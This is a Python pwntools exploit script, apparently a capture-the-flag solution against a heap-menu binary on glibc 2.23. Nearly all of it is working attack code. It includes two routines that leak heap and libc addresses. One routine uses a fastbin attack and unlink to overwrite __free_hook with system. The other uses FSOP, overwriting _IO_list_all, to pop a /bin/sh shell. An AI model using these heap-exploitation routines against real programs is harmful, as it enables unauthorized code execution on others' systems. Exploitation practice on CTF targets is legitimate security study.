from parse_args_and_some_func import *

sh = all_parsed_args['io']
cur_elf = all_parsed_args['cur_elf']

if all_parsed_args['debug_enable']:
    libc = cur_elf.libc
else:
    libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so')

# sh = process()

context.arch="amd64"

initial_date = flat(0, 0x31, 0, 0x31)

def allocate(idx, data=initial_date):
    if len(data) != 0x20:
        if isinstance(data, str):
            data += "\n"
        else:
            data += b"\n"
    sh.sendlineafter("Choice:", "1")
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", data)
    sh.recvline()


def edit(idx, data):
    if len(data) != 0x20:
        if isinstance(data, str):
            data += "\n"
        else:
            data += b"\n"
    sh.sendlineafter("Choice:", "2")
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", data)
    sh.recvline()


def show(idx):
    sh.sendlineafter("Choice:", "3")
    sh.sendlineafter("Index:", str(idx))
    msg = sh.recvline()
    info("msg ===> {}".format(msg))
    return msg


def free(idx):
    sh.sendlineafter("Choice:", "4")
    sh.sendlineafter("Index:", str(idx))


def attack_unlink():
    allocate(0)
    allocate(1)
    allocate(2)
    allocate(3)
    allocate(4, "/bin/sh\x00")

    free(1)
    free(0)
    # leak heap addr
    msg = show(0)
    leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)
    # fast bin attack
    free(1)
    allocate(5, flat(leak_heap_addr - 0x20))
    allocate(6, "a")
    allocate(7, "a")
    target_addr = 0x602090
    allocate(8, flat(target_addr - 0x18, target_addr - 0x10, 0x20, 0x90))

    # edit 0 to set fake size
    edit(0, flat(0, "\x21"))
    # unlink
    free(1)

    # leak libc addr
    msg = show(8)
    leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc.address = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc.address)

    edit(6, p64(libc.sym['__free_hook'])[:-1])
    edit(3, flat(libc.sym['system']))

    free(4)

    sh.interactive()


def attack_fsop():
    allocate(0)
    allocate(1)
    allocate(2)
    allocate(3)
    allocate(4, "/bin/sh\x00")

    free(1)
    free(0)
    # leak heap addr
    msg = show(0)
    leak_heap_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    edit(0, flat(leak_heap_addr - 0x10))
    allocate(5, "a")
    allocate(6, flat(0, 0x91))
    allocate(7, flat(0, leak_heap_addr - 0x20)) # prepare for vtable

    # leak libc addr
    free(1)

    msg = show(1)
    leak_libc_addr = u64(msg[:-1].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc.address = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc.address)

    # fsop
    edit(6, flat("/bin/sh\x00", 0x61, 0, libc.sym['_IO_list_all'] - 0x10))
    edit(0, flat(0, 0, 0, libc.sym['system']))

    sh.sendlineafter("Choice:", "1")
    sh.sendlineafter("Index:", str(8))

    sh.interactive()


attack_unlink()